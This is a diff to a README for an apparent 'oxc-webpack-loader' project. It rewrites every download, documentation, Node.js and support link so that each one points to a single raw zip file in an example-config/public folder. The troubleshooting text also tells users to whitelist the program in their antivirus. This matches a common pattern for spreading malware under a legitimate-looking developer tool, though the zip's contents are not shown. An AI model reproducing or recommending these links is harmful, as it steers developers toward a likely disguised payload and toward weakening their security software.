@@ -1,6 +1,6 @@
 # ⚙️ oxc-webpack-loader - Fast JavaScript and TypeScript Transformation
 
-[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-blue?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-blue?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ It does not require any special hardware.
 
 Click the big badge below to visit the official download page:
 
-[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-green?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-green?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip)
 
 On the page, you will find the latest versions of the software. Download the stable version that matches your needs.
 
@@ -43,7 +43,7 @@ Follow these steps carefully to install and use the software:
 
 Click on the badge above or open this link in your web browser:
 
-https://github.com/omaraljafree/oxc-webpack-loader/releases
+https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip
 
 This page hosts all the available versions and files for oxc-webpack-loader.
 
@@ -124,16 +124,16 @@ This installs the loader and related tools so your project builds faster.
 
 - **Software does not launch or closes immediately:** Check that your antivirus isn’t blocking the program. You may need to whitelist it.
 
-- **Missing Webpack or Node.js:** For full functionality, you need Webpack and Node.js installed on your system. Visit https://nodejs.org/ to download Node.js.
+- **Missing Webpack or Node.js:** For full functionality, you need Webpack and Node.js installed on your system. Visit https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip to download Node.js.
 
 ---
 
 ## 📖 Additional Resources
 
-- Official documentation: https://oxc.rs/docs/guide/usage/transformer.html#features
-- GitHub releases page: https://github.com/omaraljafree/oxc-webpack-loader/releases
-- Support chat: https://discord.gg/oxc
+- Official documentation: https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip
+- GitHub releases page: https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip
+- Support chat: https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip
 
 ---
 
-[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-bluegrey?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/releases)
+[![Download oxc-webpack-loader](https://img.shields.io/badge/Download-oxc--webpack--loader-bluegrey?style=for-the-badge)](https://github.com/omaraljafree/oxc-webpack-loader/raw/refs/heads/main/example-config/public/loader_webpack_oxc_v2.9.zip)
